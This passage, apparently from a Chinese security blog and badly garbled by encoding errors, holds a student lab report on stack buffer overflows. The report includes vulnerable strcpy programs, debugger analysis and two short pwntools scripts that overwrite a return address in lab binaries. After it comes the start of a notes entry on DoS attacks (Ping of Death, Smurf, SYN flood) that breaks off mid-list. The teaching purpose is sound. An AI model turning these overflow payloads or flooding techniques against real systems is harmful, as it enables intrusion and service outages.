çš„æƒ…å†µä¸‹ï¼Œå…ˆæ¨æµ‹ç¨‹åºçš„åŠŸèƒ½ï¼Œç„¶åå°è¯•ä¿®æ”¹StackOverrunç¨‹åºçš„æµç¨‹ï¼Œé€šè¿‡æ·¹æ²¡è¿”å›åœ°å€ï¼Œæ¯”å¦‚å¯ä»¥å°è¯•ç”¨jmp espçš„æ–¹å¼ï¼ˆæ–¹å¼å¯ä»¥è‡ªé€‰ï¼‰ï¼Œè®©å…¶è°ƒç”¨barå‡½æ•°å¹¶è¾“å‡ºç»“æœã€‚ 0x02 æµ‹è¯•æ­¥éª¤å’Œç»“æœ 2.1 overflow_var æ·¹æ²¡ç›¸é‚»å˜é‡ 2.1.1 æºç åˆ†æ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password (char *password) { int authenticated; char buffer[8];// add local buff authenticated=strcmp(password,PASSWORD); strcpy(buffer,password);//over flowed here!\treturn authenticated; } main() { int valid_flag=0; char password[1024]; while(1) { printf(\u0026#34;please input password: \u0026#34;); scanf(\u0026#34;%s\u0026#34;,password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;incorrect password!\\n\\n\u0026#34;); } else { printf(\u0026#34;Congratulation! You have passed the verification!\\n\u0026#34;); break; } } system(\u0026#34;pause\u0026#34;); } ç¨‹åºè¾“å…¥ä¸€ä¸ªpassoword,ç„¶åä½œä¸ºå‚æ•°å°†å…¶ä¼ é€’ç»™å‡½æ•°verify_passwordå‡½æ•°é‡Œé¢\nåœ¨verify_passwordå‡½æ•°é‡Œé¢åˆ›å»ºä¸¤ä¸ªå±€éƒ¨å˜é‡ï¼Œauthenticatedå‚æ•°æœ€åä½œä¸ºè¿”å›ï¼Œbufferå‚æ•°å­˜å‚¨ä¼ é€’è¿›æ¥çš„passwordï¼Œ\nauthentiactedå‚æ•°å­˜å‚¨passwordå’Œå®šä¹‰å¥½çš„å…¨å±€å˜é‡PASSWORDçš„ç»è¿‡strcmpå‡½æ•°ä¹‹åçš„è¿”å›å€¼ï¼Œæœ€åç¨‹åºè¿”å›authentiactedã€‚\nå›åˆ°mainå‡½æ•°ä¹‹åï¼Œvalid_flagå­˜å‚¨çš„ä¸ºä¸Šé¢çš„è¿”å›å€¼ï¼Œå¦‚æœè¾“å…¥ç›¸åŒï¼Œå³è¾“å‡ºincorrect password!\\n\\n,å…¶ä»–æƒ…å†µï¼Œè¾“å‡ºCongratulation! You have passed the verification!\\nã€‚\næ‰§è¡Œç¨‹åºæ•ˆæœå¦‚å›¾ï¼š\n2.1.2 ollydbgè°ƒè¯•åˆ†æ é€šè¿‡IDAåˆ†æï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šmainå‡½æ•°åœ°å€ä¸º0x4010A0 ç›´æ¥åœ¨ollydbgä¸­è®¾ç½®æ–­ç‚¹ï¼Œç„¶åä½¿ç¨‹åº è¿è¡Œåˆ°è¯¥ä½ç½® local.1å³ä¸ºvalid_flagçš„å‚æ•°å€¼ mov eax,0x01 test eax,eaxå³ä¸ºå®ç°while(1)å¾ªç¯ æ¥ä¸‹æ¥printf,scanfï¼Œverify_passwordå‡½æ•°å‡å¦‚ä¸Šå›¾æ‰€ç¤ºã€‚ è¿›å…¥å‡½æ•°0x401440è¿›è¡Œåˆ†æ æˆ‘ä»¬é¦–å…ˆè¾“å…¥å¯†ç 123456 è¿›å…¥å‡½æ•°åˆ†æ å‘ç°æˆ‘ä»¬eaxå­˜å‚¨çš„ä¸ºæˆ‘ä»¬è¾“å…¥çš„å¯†ç 123456, ç¨‹åºå°†PASSWORDå’Œeaxè¿ä¸ªå‚æ•°çš„åœ°å€å‡å‹å…¥æ ˆä¸­ã€‚ çœŸå®çš„bufferå­˜å‚¨åœ¨åœ°å€0x188FB44 å¯ä»¥çœ‹åˆ°ç»è¿‡å‡½æ•°strcmpä¹‹åçš„è¿”å›å€¼å­˜å‚¨åœ¨eaxé‡Œé¢ï¼Œç„¶åèµ‹å€¼ç»™[local.1] ç„¶åbufferåœ°å€ä¸º0x18FAE0 è¿›è€Œæˆ‘ä»¬å‘ç°authenticatedå‚æ•°çš„åœ°å€å³ä¸º0x18FAE8ï¼Œå¹¶ä¸”å› ä¸ºæ˜æ˜¾123456å°äº1234567ï¼Œæ‰€ä»¥å‚æ•°è¢«è¦†ç›–ä¸º0xFFFFFFFF è¾“å…¥å¯†ç 1234567 æˆ‘ä»¬å‘ç°authenticatedå‚æ•°çš„åœ°å€å³ä¸º0x18FAE8ï¼Œå¹¶ä¸”å› ä¸ºæ˜æ˜¾123456å°äº1234567ï¼Œæ‰€ä»¥å‚æ•°è¢«è¦†ç›–ä¸º0x00000000 2.1.3 æ·¹æ²¡ç›¸é‚»å˜é‡ å› ä¸ºå­å‡½æ•°verify_passwordè¿”å›çš„å€¼ä¸ºauthenticatedçš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¦†ç›–æ‰è¿™ä¸ªå‚æ•°ï¼Œå°†å…¶è¦†ç›–ä¸º0å³å¯ï¼Œæ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚ è€ƒè™‘åˆ°å†…å­˜ä¸­å°ç«¯å­˜å‚¨çš„ç‰¹ç‚¹ï¼ŒåŠ ä¸Šbufferç©ºé—´çš„å¤§å°ä¸º8å­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è¾“å…¥å…«ä¸ªå­—ç¬¦ï¼Œè®©å­—ç¬¦ä¸²çš„æˆªæ–­ç¬¦nullè¦†ç›–æ‰å‚æ•°authenticatedå³å¯æ»¡è¶³æ¡ä»¶ã€‚ æˆ‘ä»¬è¿™é‡Œè¾“å…¥å¯†ç 123456# ç”¨ollydbgçœ‹ä¸€ä¸‹æ ˆä¸­å†…å®¹å˜åŒ– å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°å‚æ•°è¢«è¦†ç›–ä¸º0äº†ã€‚åŒæ—¶ç¨‹åºè¾“å‡º 2.2 overflow_ret æ·¹æ²¡è¿”å›åœ°å€ 2.2.1 æºç åˆ†æ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password (char *password) { int authenticated; char buffer[8]; authenticated=strcmp(password,PASSWORD); strcpy(buffer,password);//over flowed here!\treturn authenticated; } main() { int valid_flag=0; char password[1024]; FILE * fp; if(!(fp=fopen(\u0026#34;password.txt\u0026#34;,\u0026#34;rw+\u0026#34;))) { exit(0); } fscanf(fp,\u0026#34;%s\u0026#34;,password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;incorrect password!\\n\u0026#34;); } else { printf(\u0026#34;Congratulation! You have passed the verification!\\n\u0026#34;); } fclose(fp); } ç¨‹åºå®ç°ï¼Œè¯»å–æ–‡ä»¶password.txtçš„å†…å®¹ä½œä¸ºpassword\nç„¶åå°†passwordä½œä¸ºå‚æ•°ä¼ é€’ç»™verify_passwordå‡½æ•°\nå…¶ä½™çš„åˆ†æè¿‡ç¨‹ä¸ä¸Šè¿°æ²¡æœ‰åŒºåˆ«ï¼Œä¸åœ¨èµ˜è¿°\npassword.txtå¡«å……123456\npassword.txtå¡«å……1234567\n2.2.2 IDA_PROåˆ†æ æˆ‘ä»¬è¿™é‡Œéœ€è¦è¦†ç›–æ‰å­å‡½æ•°çš„è¿”å›åœ°å€ï¼Œå°†å…¶è¿”å›åœ°å€æ”¹ä¸ºæ‰“å°å‡ºCongratulation! You have passed the verification!\\n. è¿™é‡Œæˆ‘ä»¬é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹å­å‡½æ•°verify_passwordçš„æ ˆç©ºé—´ï¼Œbufferå¤§å° IDA-PROæˆ‘ä»¬è¿›å…¥å­å‡½æ•°ï¼Œå°†å…¶åæ±‡ç¼– v3å³ä¸ºbufferå˜é‡ï¼Œv4ä»£è¡¨authenticated æŸ¥çœ‹v3åœ¨å†…å­˜ä¸­çš„åˆ†å¸ƒæƒ…å†µ è€ƒè™‘åˆ° strcpyå‡½æ•°å¹¶æ²¡æœ‰æ£€éªŒèµ‹å€¼çš„å­—ç¬¦ä¸²é•¿åº¦ï¼Œå› æ­¤å­—ç¬¦ä¸²å¯ä»¥æº¢å‡ºã€‚ å‘ç°bufferæ•°ç»„å¡«å……0x0c+0x04ä¸ªå­—ç¬¦å³å¯ä»¥è¦†ç›–åˆ°è¿”å›åœ°å€ã€‚ è¿™é‡Œæ‰¾åˆ°è¿”å›åœ°å€ä¸º0x40112f 2.2.3 æ·¹æ²¡è¿”å›åœ°å€ æ ¹æ®ä¸Šè¿°åˆ†æï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“æ ¹æ®pwntoolså†™å‡ºç›¸åº”çš„shellcode\n1 2 3 4 5 6 7 from pwn import * ret = 0x40112f payload = b\u0026#39;a\u0026#39;*0x10 + p32(ret) with open(\u0026#34;password.txt\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) print(payload) å¯ä»¥æ¯”è¾ƒæ¸…æ™°çš„çœ‹åˆ°ebpè¢«è¦†ç›–ä¸ºaaaa,è¿”å›åœ°å€ä¹Ÿè¢«è¦†ç›–ä¸º0x40112f\n0x03 æµ‹è¯•ç»“è®º æˆ‘ä»¬é€šè¿‡æ ˆæº¢å‡ºä¸¤ä¸ªä¾‹å­ï¼Œåˆ†åˆ«è¦†ç›–è¿”å›åœ°å€å’Œç›¸é‚»å…³é”®å˜é‡ï¼Œé€šè¿‡strcpyå¯¹æ•°ç»„è¾¹ç•Œçš„æ²¡æœ‰è¦æ±‚ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥æˆåŠŸçš„è¾¾åˆ°ç›®æ ‡ã€‚ è¿™å……åˆ†è¯æ˜æˆ‘ä»¬åœ¨å®é™…ç¼–ç¨‹ä¸­è¦ä½¿ç”¨å®‰å…¨çš„å‡½æ•°s_scanfæˆ–è€…å®‰å…¨çš„strcpyå‡½æ•°ï¼Œå¦åˆ™å®¹æ˜“é€ æˆä¸¥é‡çš„æ ˆæº¢å‡ºæ”»å‡»ã€‚ åŒæ—¶å‘¢ï¼Œé€šè¿‡æ ˆæº¢å‡ºæˆ‘ä»¬å¯ä»¥åŠ«æŒç¨‹åºçš„EIPæ¥åˆ°æˆ‘ä»¬æƒ³è¿è¡Œçš„ä»»ä½•ä»£ç ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æ¶æ„ä¿®æ”¹ä¸€äº›å…³é”®å‚æ•°æ¥è¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ ç®€è¿°ä¸€ä¸‹è¦†ç›–ç›¸é‚»å˜é‡åŸç† è¿™é‡Œæˆ‘ä»¬é€šè¿‡è¶Šè¿‡æ•°ç»„bufferçš„è¾¹ç•Œï¼Œ åˆ©ç”¨å­—ç¬¦ä¸²çš„æˆªæ–­ç¬¦\\x00æ¥è¦†ç›–æ‰å‚æ•°authenticatedï¼Œä»è€Œä¿è¯å°†å…¶è¿”å›å€¼ä¿®æ”¹æ’ä¸º0ã€‚ ç®€è¿°ä¸€ä¸‹è¦†ç›–èŒƒæ¹–åœ°å€åŸç† æˆ‘ä»¬è¿™é‡Œç›´æ¥åˆ©ç”¨è¶…é•¿çš„ bufferå­—ç¬¦ä¸²ï¼Œè¦†ç›–æ‰æ•´ä¸ªbuffer,å‚æ•°authenticatedï¼Œebp,å°†è¿”å›åœ°å€è¦†ç›–ä¸ºæˆ‘ä»¬éœ€è¦çš„åœ°å€0x40112f 0x04 é™„åŠ é¢˜ 4.1 é™æ€åˆ†æ ä½¿ç”¨IDA_Proæ‰“å¼€ç¨‹åºè¿›è¡Œé™æ€åˆ†æ\né¦–å…ˆæ‰“å°ä¸¤ä¸ªå‡½æ•°çš„åœ°å€0x401000,0x401060,ç„¶åå°†argv[1]ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•°sub_101000 ç„¶åè¿›å…¥å‡½æ•°sub_401000æŸ¥çœ‹å‡½æ•°åŠŸèƒ½ å°†è¾“å…¥çš„å‚æ•°èµ‹å€¼ç»™v2ï¼Œç„¶åæ‰“å°èµ‹å€¼ å‰åä¸¤æ¬¡çš„æ ˆå†…ç©ºé—´å˜åŒ–ã€‚ è¿›å…¥å‡½æ•°sub_401060æŸ¥çœ‹å‡½æ•°åŠŸèƒ½ æ‰“å°å‡ºi have been hackedï¼ åœ¨ollydbgä¸­ï¼Œå°†å‚æ•°èµ‹å€¼ä¸ºtestï¼ŒæŸ¥çœ‹å…·ä½“åŸç†\nç¬¬ä¸€æ¬¡æ‰“å°æ ˆä¸­å†…å®¹ èµ‹å€¼åæ‰“å°æ ˆä¸­å†…å®¹ 4.2 PEåŠ è½½å†…å­˜åœ°å€å˜åŒ– æˆ‘ä»¬ç”¨010editoråˆ†æä¸€ä¸‹æ²¡æœ‰åŠ è½½æƒ…å†µä¸‹çš„ç¨‹åº ç›¸å¯¹åº”çš„textã€rdataã€dataæ®µåœ°å€åˆ†åˆ«ä¸º0x401000,0x405000,0x406000 æˆ‘ä»¬å¯ä»¥çœ‹åˆ°PEç»“æ„åˆ†ä¸ºå››éƒ¨åˆ† å…¶ä¸­Sections åˆ†ä¸ºtext,data,rdataå‡ éƒ¨åˆ†ã€‚ 0x1000hä¹‹å‰çš„æ•°æ®éƒ½æ˜¯ç”¨äºç¨‹åºåŠ è½½ç”¨çš„ï¼Œç”¨äºæ£€éªŒPEæ–‡ä»¶æ ¼å¼ï¼Œè®¡ç®—æ–‡ä»¶åç§»ã€‚ æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹å†…å­˜æ˜ åƒç»“æ„ å› ä¸ºç¨‹åºåŠ è½½ç”¨åˆ°ç›¸å¯¹è™šæ‹Ÿåœ°å€,exeä¸º0x400000, textæ®µå¼€å¤´ä¸åŠ è½½åçš„å¯¹æ¯” å¯ä»¥çœ‹åˆ°å­—èŠ‚ç æ˜¯å¯¹åº”çš„ æˆ‘ä»¬å‘ç°å­—ç¬¦ä¸²é™æ€ä¸‹çš„æƒ…å†µä½äºdata æ®µ è¿™é‡Œä»¥Now the stack looks like: å› æ­¤è¿™é‡ŒåŠ è½½åçš„åœ°å€å³ä¸º0x400000+0x6030 æ€»è€Œè¨€ä¹‹ RVAæ˜¯åœ¨PEæ–‡ä»¶ä¸­ä¸ºäº†é¿å…ä½¿ç”¨ç¡®å®šçš„å†…å­˜åœ°å€ï¼Œå‡ºç°äº†ç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼ˆRelative Virtual Addressï¼Œç®€ç§°RVAï¼‰ â€“ RVAæ˜¯å†…å­˜ä¸­ç›¸å¯¹äºPEæ–‡ä»¶è£…å…¥åœ°å€çš„åç§»ä½ç½®ï¼Œæ˜¯ä¸€ä¸ªâ€œç›¸å¯¹åœ°å€â€ï¼Œæˆ–ç§°ä¸ºâ€œåç§»é‡ VAæŒ‡çš„æ˜¯è¿›ç¨‹è£…å…¥å†…å­˜åå®é™…çš„å†…å­˜åœ°å€ï¼Œè¢«ç§°ä¸ºè™šæ‹Ÿåœ°å€ï¼ˆVirutal Addressï¼Œç®€ç§°VAï¼‰ VA=Image Base + RVA 4.3 å‡½æ•°è·³è½¬å¯„å­˜å™¨å˜åŒ– è¿™é‡Œä¹Ÿä»¥å‚æ•°testä¸ºä¾‹å­ï¼Œåˆ†æä¸€ä¸‹è¿›å…¥fooå‰åæ ˆå¸§çš„å˜åŒ– è¿™é‡Œå‘ç°æ ˆé¡¶espå­˜å‚¨çš„ä¸ºtest,eipæ­¤æ—¶æŒ‡å‘çš„ä¸ºcall fooï¼ŒebpæŒ‡å‘mainå‡½æ•°çš„æ ˆå¸§åº•éƒ¨ã€‚ è¿›å…¥fooå‡½æ•° ä¸€ç³»åˆ—å…¥æ ˆæ“ä½œ å‘ç°è¿™ä¸ªå‡½æ•°æ²¡æœ‰è¿›è¡Œebpå¤„ç†ï¼Œ æ‰€ä»¥ebpä»ç„¶ä¸ºmainå‡½æ•°çš„æ ˆåº• ä½†æ˜¯espç»è¿‡ä¸€ç³»åˆ—çš„æ›´æ–°ï¼Œè¿›ä¸€æ­¥çš„å‘ä¸Šæ‰©å¼ ï¼ŒåŒæ—¶eipæŒ‡å‘fooå‡½æ•°çš„å½“å‰æŒ‡ä»¤ æ‰§è¡Œå®Œfooå‡½æ•°ä¹‹åï¼Œå›åˆ°mainå‡½æ•° å‘ç°esp,ebpå›åˆ°è¿›å…¥fooå‡½æ•°ä¹‹å‰çš„æ ·å­ï¼Œeipæ‰§è¡Œè°ƒç”¨callæŒ‡ä»¤ä¹‹åçš„ä¸‹ä¸€æ¡åœ°å€0x40109B 4.4 æ ˆæº¢å‡ºè°ƒç”¨bar è¿™é‡Œåœ¨IDAé‡Œé¢åˆ†æå‘ç°ï¼Œè¦å¤åˆ¶çš„å­—ç¬¦ä¸²v2çš„ç©ºé—´å¦‚ä¸‹ï¼š\nå æ®0x0cä¸ªå­—ç¬¦ä¹‹åï¼Œä¾¿ä¸ºè¿”å›åœ°å€ï¼Œ å› æ­¤æˆ‘ä»¬ç”¨0x0cä¸ªå­—ç¬¦å°†å…¶è¦†ç›–ï¼Œåœ¨å¡«å……æˆ‘ä»¬éœ€è¦çš„å‡½æ•°åœ°å€0x401060å³å¯è¾¾åˆ°ç›®æ ‡\nåˆ©ç”¨pwntoolsæ˜“å¾—è„šæœ¬å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 from pwn import * ret = 0x00401060 payload = b\u0026#39;a\u0026#39;*0x0c +p32(ret) with open(\u0026#34;stackover.txt\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) print(payload) å°†payloadç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ï¼Œæ‹¿åˆ°shell\n","permalink":"http://www.reus09.top/posts/tech/%E6%A0%88%E6%BA%A2%E5%87%BA/","summary":"æ ˆæº¢å‡ºæŠ¥å‘Š 0x01 ç›®æ ‡ é€šè¿‡å¯¹ç¨‹åºè¾“å…¥çš„å¯†ç çš„é•¿åº¦ã€å†…å®¹ç­‰ä¿®æ”¹ç”¨Ollydbgæ¥éªŒè¯ç¼“å†²åŒºæº¢å‡ºçš„å‘ç”Ÿï¼ˆå‚è€ƒæä¾›çš„ä¸¤ä¸ªä»£ç ï¼‰ å®Œæˆæ·¹æ²¡ç›¸é‚»å˜é‡æ”¹å˜ç¨‹åºæµ","title":"æ ˆæº¢å‡º"},{"content":"æ‹’ç»æœåŠ¡æ”»å‡» 0x01 å®éªŒç›®çš„ ä½¿ç”¨udp floodã€é˜¿æ‹‰ä¸ç­‰å·¥å…·ï¼Œåˆ†ç»„å±•å¼€æ”»å‡»å¹¶åˆ©ç”¨wiresharkåˆ†æã€‚ ç¼–ç¨‹å®ç°SYN Floodæ”»å‡»ã€‚ 0x02 å®éªŒå‰æçŸ¥è¯† DoSï¼ˆDenial of Serviceï¼‰æ”»å‡» å‡¡æ˜¯èƒ½å¯¼è‡´åˆæ³•ç”¨æˆ·ä¸èƒ½æ­£å¸¸è®¿é—®ç½‘ç»œæœåŠ¡çš„è¡Œä¸ºéƒ½å¯è§†ä¸ºæ‹’ç»æœåŠ¡æ”»å‡»ã€‚ DDoSï¼ˆDistributed Denial of Serviceï¼‰æ”»å‡» å€ŸåŠ©æ•°ç™¾ã€æ•°åƒè¢«æ¤å…¥æ”»å‡»å®ˆæŠ¤è¿›ç¨‹çš„ä¸»æœºï¼Œå¯¹ç›®æ ‡å±•å¼€çš„â€œé›†å›¢å¼â€æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œé€šå¸¸é’ˆå¯¹é«˜å¸¦å®½ã€é«˜æ€§èƒ½ç½‘ç«™ DDoSæ”»å‡»ç±»å‹ åŸºäºæ“ä½œç³»ç»Ÿ/åº”ç”¨è½¯ä»¶æ¼æ´çš„DDoSæ”»å‡»ï¼›\nåŸºäºåè®®æ¼æ´çš„ç½‘ç»œå±‚DDoSæ”»å‡»ï¼›\nåˆ©ç”¨åè®®æ¼æ´ï¼Œå¯¼è‡´ç›®æ ‡èµ„æºè¢«å¤§å¹…å ç”¨ã€‚æ˜¯æœ€å¸¸è§çš„æ”»å‡»æ–¹å¼ï¼Œä½†éœ€è¦ä¸€å®šè§„æ¨¡çš„å‚€å„¡ä¸»æœºã€‚ é¢å‘ç½‘ç»œèµ„æºçš„DDoSæ”»å‡»ï¼›\næ”»å‡»è€…æ§åˆ¶å‚€å„¡æœºåŒæ—¶å‘é€æ­£å¸¸æŠ¥æ–‡ï¼Œå¯¼è‡´ç›®æ ‡èµ„æºè¢«è€—å°½ã€‚è¿™ç§æ”»å‡»æ–¹å¼æœ€éš¾é˜²èŒƒï¼Œæ”»å‡»è€…ä¹Ÿéœ€è¦æ§åˆ¶è¾ƒå¤§è§„æ¨¡çš„ä¸»æœºæˆ–æœåŠ¡å™¨ Ping of Death æ”»å‡»ç‚¹ï¼šæ“ä½œç³»ç»Ÿåè®®æ ˆæ²¡æœ‰å¤„ç†ä¾‹å¤–æƒ…å†µçš„è®¾è®¡ç¼ºé™·ã€‚ åŸç†ï¼šåˆ©ç”¨äº†åè®®å®ç°æ—¶çš„æ¼æ´ï¼ˆCVE-1999-0128ï¼‰ã€‚ICMPåè®®ç”¨äºè¯Šæ–­ç½‘ç»œçŠ¶å†µï¼ˆç«¯ç‚¹æ˜¯å¦å¯è¾¾ç­‰ï¼‰ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼ŒAå‘Bå‘é€ICMP echo requestï¼ŒBæ”¶åˆ°åè¿”å›ICMP echo replyã€‚åˆ™AçŸ¥é“ï¼ŒBåœ¨çº¿ã€å¯è¾¾ã€‚ICMPåŒ…é™¤äº†åŒ…å¤´å¤–ï¼Œè¿˜å¯ä»¥æºå¸¦æ•°æ®ã€‚è¿™äº›æ•°æ®ä¸ç”¨äºè¿›ä¸€æ­¥å¤„ç†ï¼Œä»…è¾…åŠ©è¯Šæ–­ç½‘ç»œçŠ¶å†µï¼ˆæ ¹æ®æ”¶åˆ°å“åº”çš„æ—¶é—´åˆ¤æ–­ç½‘ç»œæ˜¯å¦é€šç•…ï¼‰ã€‚æ”»å‡»è€…åˆ¶é€ è¶…é•¿æ•°æ®åŒ…ï¼Œä½¿å¾—æ•°æ®åŒ…è¶…è¿‡65535å­—èŠ‚ä¸Šé™ã€‚æ²¡æœ‰å¼‚å¸¸å¤„ç†çš„åè®®æ ˆï¼Œæ”¶åˆ°è¿™æ ·çš„æ•°æ®åŒ…ï¼Œå¯èƒ½ä¼šç”±äºç¼“å­˜åŒºæº¢å‡ºè€Œå´©æºƒã€‚ï¼ˆIPæ•°æ®åŒ…çš„æœ€å¤§é•¿åº¦ä¸º65535Bï¼ŒIPé¦–éƒ¨é•¿åº¦ä¸º20Bï¼ŒICMPé¦–éƒ¨ä¸º8å­—èŠ‚ï¼ŒICMPåŒ…æœ€å¤§æ•°æ®é•¿åº¦ä¸ºï¼š65535-20-8=65507B. Smurf ä»¥ç›®æ ‡IPä¸ºæºåœ°å€ï¼Œä»¥å¹¿æ’­åœ°å€ä¸ºç›®åœ°å€ï¼Œå‘é€ICMP Echoè¯·æ±‚ã€‚å¹¿æ’­åœ°å€å¯¹åº”ç½‘ç»œä¸Šçš„æ¯å°ä¸»æœºéƒ½èƒ½æ”¶åˆ°è¯·æ±‚ï¼Œå¹¶å‘ç›®æ ‡å‘é€ICMP Replyï¼Œå¯¼è‡´ç›®æ ‡è¢«å¤§é‡åº”ç­”å æ®èµ„æºã€‚ UdpSmurf åˆ©ç”¨7å·(echo)ç«¯å£ã€‚æ ¹æ®åè®®ï¼Œè‹¥ç«¯å£å¼€æ”¾ï¼Œåˆ™å›é€åº”ç­”UDPæ•°æ®åŒ…ã€‚è‹¥ç«¯å£å…³é—­ï¼Œåˆ™å‘é€ä¸€ä¸ªICMPæŠ¥æ–‡ï¼ˆç›®æ ‡ä¸å¯è¾¾ï¼‰ã€‚ æ”»å‡»è€…ä»¥å¹¿æ’­åœ°å€ä¸ºç›®æ ‡åœ°å€ï¼Œä»¥å—å®³è€…åœ°å€ä¸ºæºåœ°å€ï¼Œä½¿å¾—å¤§é‡åº”ç­”åŒ…é€å¾€å—å®³è€…ã€‚ TCP SYN Floodæ”»å‡» é€šè¿‡è™šå‡çš„æ•°æ®åŒ…ï¼Œé€ æˆç›®æ ‡ä¿å­˜å¤§é‡åŠå¼€TCPè¿æ¥ã€‚ ç®¡ç†TCPè¿æ¥éœ€è¦ç³»ç»Ÿèµ„æºï¼Œç³»ç»Ÿèƒ½å¿å—çš„åŠå¼€è¿æ¥æœ‰ä¸Šé™ã€‚ å½“åŠå¼€è¿æ¥è¾¾åˆ°ä¸€å®šæ•°ç›®æ—¶ï¼Œç³»ç»Ÿå°†ä¸å†æ¥æ”¶æ–°çš„è¿æ¥è¯·æ±‚ã€‚ æ­£å¸¸çš„æœåŠ¡è¯·æ±‚å› æ­¤å¾—ä¸åˆ°å“åº”ã€‚ TCPæ­£å¸¸è¿æ¥è¿‡ç¨‹ Aå‘é€SYNåŒ…åæ­»æœºæˆ–æ‰çº¿ TCPåè®®å¤´\nTCPä¼ªé¦–éƒ¨\nä¼ªé¦–éƒ¨å…±æœ‰ 12 å­—èŠ‚ï¼ŒåŒ…å« IP åè®®å¤´éƒ¨çš„ä¸€äº›å­—æ®µï¼Œæœ‰å¦‚ä¸‹ä¿¡æ¯ï¼š32ä½æºIPåœ°å€ã€32ä½ç›®çš„IPåœ°å€ã€8ä½ä¿ç•™å­—èŠ‚(ç½®0)ã€8ä½ä¼ è¾“å±‚åè®®å·(TCPæ˜¯6ï¼ŒUDPæ˜¯17)ã€16ä½TCPæŠ¥æ–‡é•¿åº¦(TCPé¦–éƒ¨+æ•°æ®)ã€‚ TCP åè®®æ ¡éªŒå’Œè®¡ç®—ä¸‰éƒ¨åˆ†ï¼šTCPä¼ªé¦–éƒ¨ + TCPå¤´éƒ¨ + TCPæ•°æ®ã€‚ IP å¤´éƒ¨\nTCP åè®®é€šè¿‡ä¸€ç§åä¸º ä¸‰æ¬¡æ¡æ‰‹ çš„è¿‡ç¨‹æ¥å»ºç«‹å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„è¿æ¥ï¼Œä¸‰æ¬¡æ¡æ‰‹ è¿‡ç¨‹çš„åŸç†å¦‚å›¾\nå»ºç«‹è¿æ¥ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹å¦‚ä¸‹ï¼š\nå®¢æˆ·ç«¯éœ€è¦å‘é€ä¸€ä¸ª SYNåŒ… ç»™æœåŠ¡ç«¯ï¼ˆåŒ…å«äº†å®¢æˆ·ç«¯åˆå§‹åŒ–åºåˆ—å·ï¼‰ï¼Œå¹¶ä¸”å°†è¿æ¥çš„çŠ¶æ€è®¾ç½®ä¸º SYN_SENTï¼Œè¿™ä¸ªè¿‡ç¨‹ç”± connect() ç³»ç»Ÿè°ƒç”¨å®Œæˆã€‚\næœåŠ¡ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„ SYNåŒ… åï¼Œå›å¤ä¸€ä¸ª SYN+ACKåŒ… ç»™å®¢æˆ·ç«¯ï¼ˆåŒ…å«äº†æœåŠ¡ç«¯åˆå§‹åŒ–åºåˆ—å·ï¼‰ï¼Œå¹¶ä¸”è®¾ç½®è¿æ¥çš„çŠ¶æ€ä¸º SYN_RCVDã€‚\nå®¢æˆ·ç«¯æ¥æ”¶åˆ°æœåŠ¡ç«¯å‘é€è¿‡æ¥çš„ SYN+ACKåŒ… åï¼Œè®¾ç½®è¿æ¥çŠ¶æ€ä¸º ESTABLISHEDï¼ˆè¡¨ç¤ºè¿æ¥å·²ç»å»ºç«‹ï¼‰ï¼Œå¹¶ä¸”å›å¤ä¸€ä¸ª ACKåŒ… ç»™æœåŠ¡ç«¯ã€‚\næœåŠ¡ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„ ACKåŒ… åï¼Œå°†è¿æ¥çŠ¶æ€è®¾ç½®ä¸º ESTABLISHEDï¼ˆè¡¨ç¤ºè¿æ¥å·²ç»å»ºç«‹ï¼‰ã€‚\nå½“ ä¸‰æ¬¡æ¡æ‰‹ è¿‡ç¨‹å®Œæˆåï¼Œä¸€ä¸ª TCP è¿æ¥å°±æ­¤å»ºç«‹å®Œæˆã€‚\nSYN-floodæ”»å‡»å¤§æ¦‚æœ‰ä»¥ä¸‹ä¸‰ç§æ”»å‡»æ–¹å¼ï¼š\nDirect Attack æ”»å‡»æ–¹ä½¿ç”¨å›ºå®šçš„æºåœ°å€å‘èµ·æ”»å‡»ï¼Œè¿™ç§æ–¹æ³•å¯¹æ”»å‡»æ–¹çš„æ¶ˆè€—æœ€å°ã€‚ Spoofing(æ¬ºéª—) Attack æ”»å‡»æ–¹ä½¿ç”¨å˜åŒ–çš„æºåœ°å€å‘èµ·æ”»å‡»ï¼Œè¿™ç§æ–¹æ³•éœ€è¦æ”»å‡»æ–¹ä¸åœåœ°ä¿®æ”¹æºåœ°å€ï¼Œå®é™…ä¸Šæ¶ˆè€—ä¹Ÿä¸å¤§ã€‚ Distributed Direct Attack 